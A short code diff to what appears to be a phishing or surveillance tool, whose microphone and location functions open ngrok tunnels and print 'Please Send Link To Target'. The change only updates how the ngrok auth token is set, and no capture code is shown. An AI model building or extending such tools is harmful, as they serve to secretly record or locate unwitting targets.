@@ -150,7 +150,8 @@ def micro():
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     token=str(input("Input authtoken ngrok: "))
-    a = ngrok.connect(6565,"http",auth_token=token)
+    ngrok.set_auth_token(f"{token}")
+    a = ngrok.connect(6565,"http")
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -326,7 +327,8 @@ def location():
   deafult_server()
       # - - - - - - - - - - -- - - - - - - - - - - - - - - -
   token=str(input("Input authtoken ngrok: "))
-  a = ngrok.connect(8767,"http",auth_token=token)
+  ngrok.set_auth_token(f"{token}")
+  a = ngrok.connect(8767,"http")
   print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
   print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
 
